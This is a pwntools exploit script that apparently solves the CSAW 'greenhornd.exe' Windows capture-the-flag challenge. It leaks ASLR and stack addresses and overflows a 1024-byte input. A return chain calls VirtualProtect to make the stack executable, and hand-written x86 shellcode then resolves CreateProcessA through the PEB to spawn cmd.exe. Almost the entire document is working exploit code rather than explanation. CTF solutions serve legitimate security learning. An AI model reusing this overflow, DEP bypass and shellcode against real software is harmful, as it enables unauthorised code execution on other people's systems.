from pwn import *
#context.log_level = "debug"

bin_path = ".\greenhornd.exe"
args = []
#args.append("lmf")
#args.append("bp 00001234+00bf0000")
args.append("g")
#args.append("g")
s=process(bin_path)

#s = windbg.debug([bin_path],args)

s.sendlineafter("Password: ","GreenhornSecretPassword!!!\x00")
s.sendlineafter("Selection: ",'A')
s.recvuntil("so your ASLR slide is: ")
base = (int(s.recvuntil(" "),16)+0x400000)&0x00000000ffffffff
log.info("Base = " + hex(base))
s.recvuntil("stored at: ")
stack = int(s.recvuntil(".")[:-1],16)
log.info("Stack = " + hex(stack))

read_inp = p32(base + 0x001600)
vuln = p32(base + 0x0001210)
printer = p32(base + 0x00001460)
VirtualAlloc_import = p32(base + 0x002000)
printf = p32(base + 0x0001520)
addr = (base + 0x00004070)

PAGE_EXECUTE = 0x10
PAGE_EXECUTE_READWRITE = 0x40
junk = p32(base + 0x000027A8)

payload = "CSAW" + "a"*0x400
payload += printer + vuln + VirtualAlloc_import + p32(4)
s.sendlineafter("Selection: ",'V')
s.sendlineafter("Send me exactly 1024 characters (with some constraints).\n",payload)
s.recvline()
dll=u32(s.recvline()[:-1])
log.info("Kernel.dll = " + hex(dll))

"""
if( !CreateProcess( NULL,   // No module name (use command line)
        argv[1],        // Command line
        NULL,           // Process handle not inheritable
        NULL,           // Thread handle not inheritable
        FALSE,          // Set handle inheritance to FALSE
        0,              // No creation flags
        NULL,           // Use parent's environment block
        NULL,           // Use parent's starting directory 
        &si,            // Pointer to STARTUPINFO structure
        &pi )           // Pointer to PROCESS_INFORMATION structure
    ) 
"""
CreateProcessA=p32(dll+0x0001e5d0)
VirtualAlloc=p32(dll)
VirtualProtect=p32(dll+0x1da0)


commandline=(stack-0x3f0+4)
log.info("arg @ " + hex(commandline))

shellcode="\x90"*0x10 + "\x31\xC0\x64\xA1\x30\x00\x00\x00\x8B\x40\x0C\x83\xC0\x14\x8B\x00\x8B\x00\x8B\x00\x8B\x40\x10\x31\xDB\x8B\x58\x3C\x01\xC3\x8B\x5B\x78\x8B\x54\x18\x1C\x8B\x6C\x18\x20\x01\xC5\x68\x73\x41\x00\x00\x68\x6F\x63\x65\x73\x68\x74\x65\x50\x72\x68\x43\x72\x65\x61\x31\xDB\x31\xC9\x89\xE6\x89\xEF\x8B\x3C\x9F\x01\xC7\x66\x83\xC1\x0E\xF3\xA6\x74\x03\x43\xEB\xEA\x83\xC3\x02\x01\xC2\x8B\x14\x9A\x01\xC2"

part2 = "\x31\xC9\x51\x68\x65\x78\x65\x00\x68\x63\x6D\x64\x2E\x89\xE3\x89\xE0\x05\x00\x04\x00\x00\x50\x05\x00\x03\x00\x00\x50\x51\x51\x51\x51\x51\x51\x53\x51\xFF\xD2"



payload = "CSAW" + ("cmd.exe\x00" + shellcode + part2).ljust(0x400,"a")
payload += VirtualProtect + p32(stack-0x3f0+0x10) + p32(stack&0xfffff000) + p32(0x1000) + p32(0x40) + p32(addr&0xfffff000)
s.sendlineafter("Send me exactly 1024 characters (with some constraints).\n",payload)

s.interactive()
